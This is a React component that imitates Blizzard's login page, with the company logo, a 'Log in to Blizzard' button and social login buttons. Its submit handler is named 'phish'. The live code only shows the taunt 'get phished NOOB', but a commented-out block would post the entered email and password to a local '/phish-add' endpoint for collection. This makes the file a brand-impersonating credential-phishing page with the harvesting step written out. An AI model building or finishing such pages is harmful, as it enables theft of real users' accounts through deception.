import React from "react";

import axios from "axios";

import { faFacebookSquare } from "@fortawesome/free-brands-svg-icons";
import { faBan } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { library } from "@fortawesome/fontawesome-svg-core";

import blizzardLogo from "../../static/assets/images/blizzard-logo.png";
import googleLogo from "../../static/assets/images/google-logo.png";

library.add(faFacebookSquare, faBan);

const Auth = props => {
  const [userEmail, setUserEmail] = React.useState("");
  const [userPassword, setUserPassword] = React.useState("");
  // const [emptyField, setEmptyField] = React.useState("");

  const [emptyBox, makeEmptyBox] = React.useState();

  const [style, setStyle] = React.useState({});

  const handleEmpty = emptyField => {
    makeEmptyBox(
      <div className="empty-field-wrapper">
        <FontAwesomeIcon className="ban" icon={["fas", "ban"]} />
        <h1 className="empty-field">{emptyField}</h1>
      </div>
    );
  };

  const phish = e => {
    e.preventDefault();

    if (userEmail === "" && userPassword === "") {
      handleEmpty("Cannot Leave Fields empty");
    } else if (userEmail === "") {
      handleEmpty("Cannot leave Username empty");
    } else if (userPassword === "") {
      handleEmpty("Cannot leave Password empty");
    } else {
      setUserEmail("get phished NOOB");
      setUserPassword("");
      setStyle({ color: "red" });
    }
    //   axios({
    //     method: "post",
    //     url: "http://localhost:5000/phish-add",
    //     data: {
    //       email: userEmail,
    //       password: userPassword
    //     }
    //   })
    //     .then(response => {
    //       console.log(response);
    //       setUserEmail("get phished NOOB");
    //       setUserPassword("");
    //       setStyle({ color: "red" });
    //     })
    //     .catch(error => console.log("KYSENJACKMAN", error));
    // }
  };

  return (
    <div className="auth-wrapper">
      <img src={blizzardLogo} />
      <div className="input-fields">
        {emptyBox}
        <input
          style={style}
          value={userEmail}
          type="email"
          placeholder="Email or Phone"
          onChange={e => setUserEmail(e.target.value)}
        />
        <input
          value={userPassword}
          type="password"
          placeholder="Password"
          onChange={e => setUserPassword(e.target.value)}
        />
        <button style={style} onClick={e => phish(e)}>
          Log in to Blizzard
        </button>
      </div>
      <div style={style} className="divider">
        <div className="line">_________________</div>
        <p>OR LOG IN WITH</p>
        <div className="line">_________________</div>
      </div>
      <div className="face-goog">
        <button
          style={style}
          onClick={() =>
            (window.location.href = "https://www.facebook.com/Blizzard/")
          }
        >
          <FontAwesomeIcon
            className="facebook-logo"
            icon={["fab", "facebook-square"]}
          />
          <p>Facebook</p>
        </button>
        <div className="lil-gap" />
        <button style={style} onClick={() => props.setPage(false)}>
          <div className="google-logo-wrapper">
            <img src={googleLogo} />
          </div>
          <p>Google</p>
        </button>
      </div>
      <div className="other-links">
        <span style={style} onClick={() => props.setPage(false)}>
          Create a free Blizzard Account
        </span>
        <span style={style} onClick={() => props.setPage(false)}>
          Can't log in?
        </span>
      </div>
    </div>
  );
};

export default Auth;
